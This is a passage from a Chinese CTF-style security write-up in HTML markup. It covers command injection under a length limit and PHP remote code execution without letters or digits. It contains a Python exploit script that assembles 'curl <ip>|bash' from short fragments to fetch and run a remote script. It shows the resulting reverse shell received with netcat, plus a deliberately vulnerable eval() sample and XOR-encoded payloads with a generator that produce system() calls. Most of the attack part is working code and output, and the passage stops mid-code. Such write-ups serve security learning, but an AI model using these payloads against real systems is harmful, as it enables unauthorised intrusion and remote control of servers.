+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="s2">&#34;&gt;bash&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\|\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;61\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;84.\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;71.\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;81.\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\ \\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;rl\\&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;cu\\&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由于有字符限制，所以按照上述拆分。
+最后，执行sh _，然后执行sh y 即可
+具体python代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">baseurl</span> <span class="o">=</span> <span class="s2">&#34;http://81.71.84.61:50002/?cmd=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">reset</span> <span class="o">=</span> <span class="s2">&#34;http://81.71.84.61:50002/?reset&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将ls -t 写入文件_</span>
+</span></span><span class="line"><span class="cl"><span class="nb">list</span><span class="o">=</span><span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;ls</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ls&gt;_&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\ </span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;-t</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\&gt;y&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ls&gt;&gt;_&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># curl 120.79.33.253|bash</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># curl 219.152.63.100|bash</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># curl 81.71.84.61|bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">list2</span><span class="o">=</span><span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;bash&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\|</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;61</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;84.</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;71.</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;81.</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;\ </span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;rl</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;cu</span><span class="se">\\</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">baseurl</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">list2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">baseurl</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">baseurl</span><span class="o">+</span><span class="s2">&#34;sh _&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">baseurl</span><span class="o">+</span><span class="s2">&#34;sh y&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#s.get(reset)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>效果如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">[</span><span class="n">root</span><span class="vi">@gr8oqhchd</span> <span class="o">~]</span><span class="c1"># nc -lv 8000</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Ncat</span><span class="p">:</span> <span class="no">Version</span> <span class="mi">7</span><span class="o">.</span><span class="mi">50</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Ncat</span><span class="p">:</span> <span class="no">Listening</span> <span class="n">on</span> <span class="o">::</span><span class="p">:</span><span class="mi">8000</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Ncat</span><span class="p">:</span> <span class="no">Listening</span> <span class="n">on</span> <span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="p">:</span><span class="mi">8000</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Ncat</span><span class="p">:</span> <span class="no">Connection</span> <span class="n">from</span> <span class="mi">81</span><span class="o">.</span><span class="mi">71</span><span class="o">.</span><span class="mi">84</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="ss">Ncat</span><span class="p">:</span> <span class="no">Connection</span> <span class="n">from</span> <span class="mi">81</span><span class="o">.</span><span class="mi">71</span><span class="o">.</span><span class="mi">84</span><span class="o">.</span><span class="mi">61</span><span class="p">:</span><span class="mi">43998</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="ss">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span> <span class="no">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+</span></span><span class="line"><span class="cl"><span class="ss">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="k">in</span> <span class="n">this</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="mi">314</span><span class="ss">b51</span><span class="p">:</span><span class="o">~</span><span class="sr">/html/s</span><span class="n">andbox_92f06c44fa329edc79eafc1eb</span><span class="err">$</span> <span class="n">ls</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">boot</span>
+</span></span><span class="line"><span class="cl"><span class="n">dev</span>
+</span></span><span class="line"><span class="cl"><span class="n">etc</span>
+</span></span><span class="line"><span class="cl"><span class="n">home</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib</span>
+</span></span><span class="line"><span class="cl"><span class="n">lib64</span>
+</span></span><span class="line"><span class="cl"><span class="n">media</span>
+</span></span><span class="line"><span class="cl"><span class="n">mnt</span>
+</span></span><span class="line"><span class="cl"><span class="n">opt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">proc</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="n">sbin</span>
+</span></span><span class="line"><span class="cl"><span class="n">srv</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">usr</span>
+</span></span><span class="line"><span class="cl"><span class="n">var</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="mi">314</span><span class="ss">b51</span><span class="p">:</span><span class="o">~</span><span class="sr">/html/s</span><span class="n">andbox_92f06c44fa329edc79eafc1eb</span><span class="err">$</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="无字母数字rce" class="headerLink">
+    <a href="#%e6%97%a0%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97rce" class="header-mark"></a>无字母数字rce</h2><p>以下三种方法可以用来解决类似这种无字母数字rce</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;hacker!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="异域构造" class="headerLink">
+    <a href="#%e5%bc%82%e5%9f%9f%e6%9e%84%e9%80%a0" class="header-mark"></a>异域构造</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$__=(&#34;#&#34;^&#34;|&#34;); // _
+</span></span><span class="line"><span class="cl">$__.=(&#34;.&#34;^&#34;~&#34;); // _P
+</span></span><span class="line"><span class="cl">$__.=(&#34;/&#34;^&#34;`&#34;); // _PO
+</span></span><span class="line"><span class="cl">$__.=(&#34;|&#34;^&#34;/&#34;); // _POS
+</span></span><span class="line"><span class="cl">$__.=(&#34;{&#34;^&#34;/&#34;); // _POST 
+</span></span><span class="line"><span class="cl">$$__[_]($$__[__]); // $_POST[_]($_POST[__]);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>随后合并并编码得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>搭建本地环境进行测试</p>
+<p>由于本地是Windows环境，所以执行的命令是dir</p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=%24__%3D(%22%23%22%5E%22%7C%22)%3B%24__.%3D(%22.%22%5E%22~%22)%3B%24__.%3D(%22%2F%22%5E%22%60%22)%3B%24__.%3D(%22%7C%22%5E%22%2F%22)%3B%24__.%3D(%22%7B%22%5E%22%2F%22)%3B%24%24__%5B_%5D(%24%24__%5B__%5D)%3B&amp;_=system&amp;__=dir
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png" title="image-20230709000012647" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000012647.png 2x"
+            sizes="auto"
+            alt="image-20230709000012647">
+    </a></figure></p>
+<p>我们可以通过脚本来实现构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ans1</span><span class="o">=</span><span class="s2">&#34;&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ans2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span> <span class="c1">#设置i的范围</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#将i转换成ascii对应的字符，并赋值给c</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-&#39;</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#在数组中增加i，这些就是未被系统过滤掉的字符</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># eval(&#34;echo($c);&#34;);</span>
+</span></span><span class="line"><span class="cl"><span class="n">mya</span><span class="o">=</span><span class="s2">&#34;system&#34;</span>  <span class="c1">#函数名 这里修改！</span>
+</span></span><span class="line"><span class="cl"><span class="n">myb</span><span class="o">=</span><span class="s2">&#34;dir&#34;</span>      <span class="c1">#参数</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">myfun</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">my</span><span class="p">):</span> <span class="c1">#自定义函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ans1</span> <span class="c1">#引用全局变量ans1，使得在局部对其进行更改时不会报错</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">ans2</span> <span class="c1">#引用全局变量ans2，使得在局部对其进行更改时不会报错</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span> <span class="c1">#设置循环范围为（0，a）注：a为未被过滤的字符数量 </span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span> <span class="c1">#在上个循环的条件下设置j的范围</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">a</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="o">==</span><span class="nb">ord</span><span class="p">(</span><span class="n">my</span><span class="p">[</span><span class="n">k</span><span class="p">])):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ans1</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="c1">#ans1=ans1+chr(a[i])</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ans2</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="c1">#ans2=ans2+chr(a[j])</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span><span class="c1">#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">mya</span><span class="p">)):</span> <span class="c1">#设置k的范围</span>
+</span></span><span class="line"><span class="cl">    <span class="n">myfun</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">mya</span><span class="p">)</span><span class="c1">#引用自定义的函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">data1</span><span class="o">=</span><span class="s2">&#34;(&#39;&#34;</span><span class="o">+</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ans1</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;^&#39;&#34;</span><span class="o">+</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ans2</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;)&#34;</span> <span class="c1">#data1等于传入的命令,&#34;+ans1+&#34;是固定格式，这样可以得到变量对应的值，再用&#39;包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ans1</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="c1">#对ans1进行重新赋值</span>
+</span></span><span class="line"><span class="cl"><span class="n">ans2</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="c1">#对ans2进行重新赋值</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">myb</span><span class="p">)):</span><span class="c1">#设置k的范围为(0,len(myb))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">myfun</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">myb</span><span class="p">)</span><span class="c1">#再次引用自定义函数</span>
+</span></span><span class="line"><span class="cl"><span class="n">data2</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ans1</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">ans2</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造system(&lsquo;dir&rsquo;);</p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">code=(&#39;%0C%05%0C%08%05%0D&#39;^&#39;%7F%7C%7F%7C%60%60&#39;)(&#34;%04%09%0D&#34;^&#34;%60%60%7F&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png" title="image-20230709000624874" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709000624874.png 2x"
+            sizes="auto"
+            alt="image-20230709000624874">
+    </a></figure></p>
+<h3 id="自增构造" class="headerLink">
+    <a href="#%e8%87%aa%e5%a2%9e%e6%9e%84%e9%80%a0" class="header-mark"></a>自增构造</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
